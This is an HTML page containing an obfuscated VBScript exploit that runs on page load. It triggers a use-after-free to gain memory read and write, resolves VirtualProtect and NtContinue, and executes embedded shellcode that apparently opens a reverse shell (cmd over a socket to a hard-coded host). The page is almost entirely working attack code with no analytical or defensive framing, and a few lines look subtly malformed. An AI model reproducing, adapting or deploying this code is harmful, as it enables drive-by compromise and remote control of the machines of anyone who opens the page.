<!DOCTYPE HTML>
<HTML lang="en">
<HEAD>
<META>
<META content="text/html; charset=UTF-8" http-equiv="Content-Type">
<META>
<META content="IE=10" http-equiv="x-ua-compatible">
<META>
<META content="0" http-equiv="Expires">
<META>
<META content="no-cache" http-equiv="Pragma">
<META>
<META content="no-cache" http-equiv="Cache-control">
<META>
<META content="no-cache" http-equiv="Cache">
<META>
</HEAD>
<BODY>
<SCRIPT language="vbscript">

DIM yaay
DIM ayyaa(6),aaaya(6)
DIM ayya
DIM aayya(40)
DIM yayaay,yaaayy
DIM ayaa
DIM yyyy,aaaay
DIM yyyyay,ayaaaa
DIM NtContinueAddr,VirtualProtectAddr

ayaa=195948557
yayaay=Unescape("%u0001%u0880%u0001%u0000%u0000%u0000%u0000%u0000%uffff%u7fff%u0000%u0000")
yaaayy=Unescape("%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000")
ayya=195890093
Function aaaaa(Domain)
	yayaa=0
	ayyyya=0
	aayaay=0
	Id=CLng(Rnd*1000000)
	yayaa=CLng((&h27d+8231-&H225b)*Rnd)Mod (&h137d+443-&H152f)+(&h1c17+131-&H1c99)
	If(Id+yayaa)Mod (&h5c0+6421-&H1ed3)=(&h10ba+5264-&H254a) Then
		yayaa=yayaa-(&h86d+6447-&H219b)
	End If

	ayyyya=CLng((&h2bd+6137-&H1a6d)*Rnd)Mod (&h769+4593-&H1940)+(&h1a08+2222-&H2255)
	aayaay=CLng((&h14e6+1728-&H1b5d)*Rnd)Mod (&hfa3+1513-&H1572)+(&h221c+947-&H256e)
	aaaaa=Domain &"?" &Chr(ayyyya) &"=" &Id &"&" &Chr(aayaay) &"=" &yayaa
End Function

Function yaaaa(ByVal yayay)
	aayy=""
	For index=0 To Len(yayay)-1
		aayy=aayy &yaya(Asc(Mid(yayay,index+1,1)),2)
	Next
	aayy=aayy &"00"
	If Len(aayy)/(&h15c6+3068-&H21c0) Mod (&h1264+2141-&H1abf)=(&hc93+6054-&H2438) Then
		aayy=aayy &"00"
	End If
	For aaay=(&h1a1a+3208-&H26a2) To Len(aayy)/(&h1b47+331-&H1c8e)-(&h14b2+4131-&H24d4)
		yaaaya=Mid(aayy,aaay*(&h576+1268-&Ha66)+(&ha64+6316-&H230f),(&ha49+1388-&Hfb3))
		yayayy=Mid(aayy,aaay*(&hf82+3732-&H1e12)+(&h210+2720-&Hcaf)+(&h4fa+5370-&H19f2),(&hf82+5508-&H2504))
		yaaaa=yaaaa &"%u" &yayayy &yaaaya
	Next
End Function
Function yaya(ByVal Number,ByVal Length)
	aaaa=Hex(Number)
	If Len(aaaa)<Length Then
		aaaa=String(Length-Len(aaaa),"0") &aaaa
	Else
		aaaa=Right(aaaa,Length)
	End If
	yaya=aaaa
End Function
Function GetUint32(yaaa)
	Dim value
	yyyy.mem(ayaa+8)=yaaa+4
	yyyy.mem(ayaa)=8
	value=yyyy.P0123456789
	yyyy.mem(ayaa)=2
	GetUint32=value
End Function
Function ayyaay(yaaa)
	ayyaay=GetUint32(yaaa) And (131071-65536)
End Function
Function yyyaa(yaaa)
	yyyaa=GetUint32(yaaa)  And (&h17eb+1312-&H1c0c)
End Function
Sub yyyyyy
End Sub
Function GetMemValue
	yyyy.mem(ayaa)=(&h713+3616-&H1530)
	GetMemValue=yyyy.mem(ayaa+(&h169c+712-&H195c))
End Function
Sub SetMemValue(ByRef ayaaay)
	yyyy.mem(ayaa+(&h715+3507-&H14c0))=ayaaay
End Sub
Function LeakVBAddr
	On Error Resume Next
	Dim yyyyy
	yyyyy=yyyyyy
	yyyyy=null
	SetMemValue yyyyy
	LeakVBAddr=GetMemValue()
End Function
Function GetBaseByDOSmodeSearch(ayyayy)
	Dim yyay
	yyay=ayyayy And &hffff0000
	Do While GetUint32(yyay+(&h748+4239-&H176f))<>544106784 Or GetUint32(yyay+(&ha2a+7373-&H268b))<>542330692
		yyay=yyay-65536
	Loop
	GetBaseByDOSmodeSearch=yyay
End Function
Function StrCompWrapper(yaaa,yyayay)
	Dim yaaya,aaay
	yaaya=""
	For aaay=(&ha2a+726-&Hd00) To Len(yyayay)-(&h2e1+5461-&H1835)
		yaaya=yaaya &Chr(yyyaa(yaaa+aaay))
	Next
	StrCompWrapper=StrComp(UCase(yaaya),UCase(yyayay))
End Function
Function GetBaseFromImport(base_address,name_input)
	Dim import_rva,nt_header,descriptor,import_dir
	Dim aaaaaa
	nt_header=GetUint32(base_address+(&h3c))
	import_rva=GetUint32(base_address+nt_header+&h80)
	import_dir=base_address+import_rva
	descriptor=0
	Do While True
		Dim Name
		Name=GetUint32(import_dir+descriptor*(&h14)+&hc)
		If Name=0 Then
			GetBaseFromImport=&hBAAD0000
			Exit Function
		Else
			If StrCompWrapper(base_address+Name,name_input)=0 Then
				Exit Do
			End If
		End If
		descriptor=descriptor+1
	Loop
	aaaaaa=GetUint32(import_dir+descriptor*(&h14)+&h10)
	GetBaseFromImport=GetBaseByDOSmodeSearch(GetUint32(base_address+aaaaaa))
End Function

Function GetProcAddr(dll_base,name)
	Dim p,export_dir,index
	Dim function_rvas,function_names,function_ordin
	Dim ayyyyy
	p=GetUint32(dll_base+&h3c)
	p=GetUint32(dll_base+p+&h78)
	export_dir=dll_base+p

	function_rvas=dll_base+GetUint32(export_dir+&h1c)
	function_names=dll_base+GetUint32(export_dir+&h20)
	function_ordin=dll_base+GetUint32(export_dir+&h24)
	index=0
	Do While True
		Dim yyya
		yyya=GetUint32(function_names+index*4)
		If StrCompWrapper(dll_base+yyya,name)=0 Then
			Exit Do
		End If
		index=index+1
	Loop
	ayyyyy=ayyaay(function_ordin+index*2)
	p=GetUint32(function_rvas+ayyyyy*4)
	GetProcAddr=dll_base+p
End Function

Function GetShellcode()
	aaya=Unescape("%u0000%u0000%u0000%u0000") &Unescape("%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u685d%u3233%u0000%u7768%u3273%u545f%u4c68%u2677%uff07%ub8d5%u0190%u0000%uc429%u5054%u2968%u6b80%uff00%u6ad5%u5908%ue250%u40fd%u4050%u6850%u0fea%ue0df%ud5ff%u6897%u0002%u5000%ue689%u106a%u5756%uc268%u37db%uff67%u57d5%ub768%u38e9%uffff%u57d5%u7468%u3bec%uffe1%u57d5%u6897%u6e75%u614d%ud5ff%u6368%u646d%u8900%u57e3%u5757%uf631%u126a%u5659%ufde2%uc766%u2444%u013c%u8d01%u2444%uc610%u4400%u5054%u5656%u4656%u4e56%u5656%u5653%u7968%u3fcc%uff86%u89d5%u4ee0%u4656%u30ff%u0868%u1d87%uff60%ubbd5%u1de0%u0a2a%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff" &yaaaa(aaaaa("")))
	aaya=aaya & String((&h80000-LenB(aaya))/2,Unescape("%u4141"))
	GetShellcode=aaya
End Function
Function EscapeAddress(ByVal value)
	Dim High,Low
	High=yaya((value And &hffff0000)/&h10000,4)
	Low=yaya(value And &hffff,4)
	EscapeAddress=Unescape("%u" &Low &"%u" &High)
End Function
Function yayyay
	Dim aaay,ayyya,aaya,ayaaa,yyyya,yyaaa,yayya
	ayyya=yaya(NtContinueAddr,8)
	ayaaa=Mid(ayyya,1,2)
	yyyya=Mid(ayyya,3,2)
	yyaaa=Mid(ayyya,5,2)
	yayya=Mid(ayyya,7,2)
	aaya=""
	aaya=aaya &"%u0000%u" &yayya &"00"
	For aaay=1 To 3
		aaya=aaya &"%u" &yyyya &yyaaa
		aaya=aaya &"%u" &yayya &ayaaa
	Next
	aaya=aaya &"%u" &yyyya &yyaaa
	aaya=aaya &"%u00" &ayaaa
	yayyay=Unescape(aaya)
End Function
Function WrapShellcodeWithNtContinueContext(ShellcodeAddrParam)
	Dim aaya
	aaya=String((100334-65536),Unescape("%u4141"))
	aaya=aaya &EscapeAddress(ShellcodeAddrParam)
	aaya=aaya &EscapeAddress(ShellcodeAddrParam)
	aaya=aaya &EscapeAddress(&h3000)
	aaya=aaya &EscapeAddress(&h40)
	aaya=aaya &EscapeAddress(ShellcodeAddrParam-8)
	aaya=aaya &String(6,Unescape("%u4242"))
	aaya=aaya &yayyay()
	aaya=aaya &String((&h80000-LenB(aaya))/2,Unescape("%u4141"))
	WrapShellcodeWithNtContinueContext=aaya
End Function
Function ExpandWithVirtualProtect(yayyy)
	Dim aaya
	Dim yyyyya
	yyyyya=yayyy+&h23
	aaya=""
	aaya=aaya &EscapeAddress(yyyyya)
	aaya=aaya &String((&hb8-LenB(aaya))/2,Unescape("%4141"))
	aaya=aaya &EscapeAddress(VirtualProtectAddr)
	aaya=aaya &EscapeAddress(&h1b)
	aaya=aaya &EscapeAddress(0)
	aaya=aaya &EscapeAddress(yayyy)
	aaya=aaya &EscapeAddress(&h23)
	aaya=aaya &String((&400-LenB(aaya))/2,Unescape("%u4343"))
	ExpandWithVirtualProtect=aaya
End Function
Sub ExecuteShellcode
	yyyy.mem(ayaa)=&h4d
	yyyy.mem(ayaa+8)=0
    msgbox(ayaa)
End Sub

Class cla1
Private Sub Class_Terminate()
	Set aaaya(ayya)=yaay((&h1078+5473-&H25d8))
	ayya=ayya+(&h14b5+2725-&H1f59)
	yaay((&h79a+3680-&H15f9))=(&h69c+1650-&Hd0d)
End Sub

End Class

Class cla2
Private Sub Class_Terminate()
	Set ayyaa(ayya)=yaay((&h15b+3616-&Hf7a))
	ayya=ayya+(&h880+542-&Ha9d)
	yaay((&h1f75+342-&H20ca))=(&had3+3461-&H1857)
End Sub
End Class

Class aaayay
End Class

Class yyaay
Dim mem
Function P
End Function
Function SetProp(Value)
	mem=Value
	SetProp=0
End Function
End Class

Class aaayyy
Dim mem
Function P0123456789
	P0123456789=LenB(mem(ayaa+8))
End Function
Function SPP
End Function
End Class

Class yyyaay
Public Default Property Get P
Dim yyaa
P=174088534690791e-324
For aaay=(&h7a0+4407-&H18d7) To (&h2eb+1143-&H75c)
	aaaya(aaay)=(&h2176+711-&H243d)
Next
Set yyaa=New aaayyy
yyaa.mem=yayaay
For aaay=(&h1729+3537-&H24fa) To (&h1df5+605-&H204c)
	Set aaaya(aaay)=yyaa
Next
End Property
End Class

Class yyyyaa
Public Default Property Get P
Dim yyaa
P=636598737289582e-328
For aaay=(&h1063+2314-&H196d) To (&h4ac+2014-&Hc84)
	ayyaa(aaay)=(&h442+2598-&He68)
Next
Set yyaa=New aaayyy
yyaa.mem=yaaayy
For aaay=(&h7eb+3652-&H162f) To (&h3e8+1657-&Ha5b)
	Set ayyaa(aaay)=yyaa
Next
End Property
End Class

Set yyyyay=New yyyaay
Set ayaaaa=New yyyyaa
Sub UAF
	For aaay=(&hfe8+3822-&H1ed6) To (&h8b+8633-&H2233)
		Set aayya(aaay)=New aaayay
	Next
	For aaay=(&haa1+6236-&H22e9) To (&h1437+3036-&H1fed)
		Set aayya(aaay)=New yyaay
	Next
	ayya=0
	For aaay=0 To 6
		ReDim yaay(1)
		Set yaay(1)=New cla1
		Erase yaay
	Next
	Set yyyy=New yyaay
	ayya=0
	For aaay=0 To 6
		ReDim yaay(1)
		Set yaay(1)=New cla2
		Erase yaay
	Next
	Set aaaay=New yyaay
End Sub
Sub InitObjects
	yyyy.SetProp(yyyyay)
	aaaay.SetProp(ayaaaa)
	ayaa=aaaay.mem
End Sub

Sub StartExploit
	UAF
	InitObjects
	vb_adrr=LeakVBAddr()
	vbs_base=GetBaseByDOSmodeSearch(GetUint32(vb_adrr))
	msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
	krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
	ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
	VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
	NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
	SetMemValue GetShellcode()
	ShellcodeAddr=GetMemValue()+8
	SetMemValue WrapShellcodeWithNtContinueContext(ShellcodeAddr)
	yayyy=GetMemValue()+69596
	SetMemValue ExpandWithVirtualProtect(yayyy)
	yyaayy=GetMemValue()
	ExecuteShellcode
End Sub
StartExploit
</SCRIPT>
</BODY>